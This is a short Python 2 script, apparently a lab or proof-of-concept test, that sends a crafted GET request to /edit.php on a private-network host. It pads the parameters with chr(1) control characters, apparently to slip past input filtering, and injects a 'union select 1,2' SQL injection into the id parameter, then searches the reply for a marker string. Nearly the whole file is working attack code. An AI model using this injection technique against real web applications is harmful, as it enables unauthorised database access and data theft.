import urllib2
import httplib
import re
import sys, time

url = '192.168.28.129'



payload = '/edit.php?test=11'
payload = payload+chr(1)

test= '&id=2%20union%20select 1,2'+chr(1)

conn = httplib.HTTPConnection(url)

print payload+test

conn.request('GET',payload+test)

res  = conn.getresponse().read()
print res
if(re.search('lufei',res)):

    print res
